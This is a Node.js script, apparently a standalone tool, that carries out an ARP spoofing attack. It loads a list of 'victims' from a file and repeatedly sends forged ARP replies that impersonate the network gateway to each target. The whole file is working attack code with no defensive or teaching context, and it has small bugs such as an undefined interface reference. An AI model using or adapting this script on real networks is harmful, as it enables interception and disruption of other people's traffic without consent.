const fs = require('fs');
const arp = require('arpjs');

const IFACE = process.argv[2];
const GATEWAY = process.argv[3];
// const MYIP = process.argv[4];
const FILEPATH = './victims.txt';

class Attack {
  constructor(packetInterval) {
    this.packetInterval = packetInterval || 1000; // recommended every 10 sec
  }

  start() {
    if (!IFACE) {
      throw Error('include an interface');
    } else {
      arp.setInterface(this.IFACE);
    }
    if (!GATEWAY) {
      throw Error('include a GATEWAY!');
    } else {
      this.targets = fs
        .readFileSync(FILEPATH)
        .toString()
        .split('\n')
        .filter(ip => ip !== '');
    }
    if (!this.targets.length) throw new Error('Gather(.sh) some victims!');

    this.stop();

    this.runningAttack = setInterval(() => {
      this.targets.forEach(target => {
        console.log('telling', GATEWAY, 'that', target, 'is fake');
        arp.send({
          op: 'reply',
          src_ip: GATEWAY,
          dst_ip: target,
          dst_mac: 'ff:ff:ff:ff:ff:ff',
        });
      });
    }, this.packetInterval);
  }

  pause(ms) {
    this.stop();
    setTimeout(this.start, ms || 5000);
  }

  stop() {
    clearInterval(this.runningAttack);
  }
}

const attack = new Attack(1000);
attack.start();
